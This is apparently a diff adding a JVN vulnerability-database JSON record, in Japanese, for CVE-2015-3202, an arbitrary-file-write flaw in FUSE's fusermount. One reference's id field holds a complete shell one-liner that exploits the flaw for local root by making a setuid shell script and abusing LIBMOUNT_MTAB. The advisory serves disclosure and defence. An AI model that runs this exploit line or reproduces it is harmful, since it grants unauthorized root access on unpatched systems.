@@ -1,0 +1,55 @@
+{
+  "about": "https://jvndb.jvn.jp/ja/contents/2015/JVNDB-2015-003431.html",
+  "title": "FUSE の fusermount における任意のファイルに書き込まれる脆弱性",
+  "link": "https://jvndb.jvn.jp/ja/contents/2015/JVNDB-2015-003431.html",
+  "description": "FUSE の fusermount は、root として (1) mount または (2) umount を呼び出す前に環境を適切にクリアしないため、任意のファイルに書き込まれる脆弱性が存在します。",
+  "identifier": "JVNDB-2015-003431",
+  "references": [
+    {
+      "text": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3202",
+      "source": "CVE",
+      "id": "CVE-2015-3202"
+    },
+    {
+      "text": "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-3202",
+      "source": "NVD",
+      "id": "CVE-2015-3202"
+    },
+    {
+      "text": "https://twitter.com/taviso/status/601370527437967360",
+      "source": "関連文書",
+      "id": "a=/tmp/.$$;b=chmod\\ u+sx;echo $b /bin/sh>$a;$b $a;a+=\\;$a;mkdir -p $a;LIBMOUNT_MTAB=/etc/$0.$0rc _FUSE_COMMFD=0 fusermount $a #CVE-2015-3202"
+    },
+    {
+      "text": "https://jvndb.jvn.jp/ja/cwe/CWE-264.html",
+      "id": "CWE-264",
+      "title": "認可・権限・アクセス制御(CWE-264)"
+    }
+  ],
+  "cpe": [
+    {
+      "text": "cpe:/a:fuse:fuse",
+      "version": "2.2",
+      "vendor": "FUSE",
+      "product": "FUSE"
+    },
+    {
+      "text": "cpe:/o:debian:debian_linux",
+      "version": "2.2",
+      "vendor": "Debian",
+      "product": "Debian GNU/Linux"
+    }
+  ],
+  "cvss": [
+    {
+      "version": "2.0",
+      "score": "3.6",
+      "type": "Base",
+      "severity": "Low",
+      "vector": "AV:L/AC:L/Au:N/C:N/I:P/A:P"
+    }
+  ],
+  "date": "2015-07-08T15:02+09:00",
+  "issued": "2015-07-08T15:02+09:00",
+  "modified": "2015-07-08T15:02+09:00"
+}
